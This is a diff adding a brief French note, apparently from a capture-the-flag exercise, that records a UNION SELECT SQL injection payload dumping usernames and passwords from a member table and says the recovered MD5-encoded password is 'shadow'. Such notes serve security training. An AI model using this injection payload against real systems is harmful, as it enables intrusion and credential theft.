@@ -1,0 +1,5 @@
+1 UNION select username, password FROM Member_Brute_Force.db_default
+
+et on recupere les passwords
+
+il est encode en md5 et la valeur est shadow
